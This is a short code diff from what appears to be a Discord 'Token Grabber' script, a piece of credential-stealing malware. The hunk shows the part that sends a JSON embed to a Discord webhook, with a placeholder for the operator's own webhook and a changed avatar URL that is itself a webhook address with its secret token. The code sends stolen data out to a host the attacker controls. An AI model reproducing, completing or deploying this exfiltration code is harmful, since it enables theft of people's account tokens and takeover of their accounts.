@@ -213,7 +213,7 @@ def main():
         "content": "",
         "embeds": embeds,
         "username": "Token Grabber",
-        "avatar_url": "https://discordapp.com/api/webhooks/861358921583296542/QlxxtB-vDKqdh2JAtl8DQln3a-M48rl-23hYYwx20WNwZzXHzFiX7n4IDpJv5jYpagLF"
+        "avatar_url": "https://discord.com/api/webhooks/1566991820456460440/QO8eiaznE-78_oTROvzj0a46qNlGo29o6SIGfxbKjQoxHRvmWj089hNpVWx54qtFGC2T"
     }
     try:
         urlopen(Request("REPLACE THIS TEXT WITH YOUR DISCORD WEBHOOK", data=dumps(webhook).encode(), headers=getheaders()))
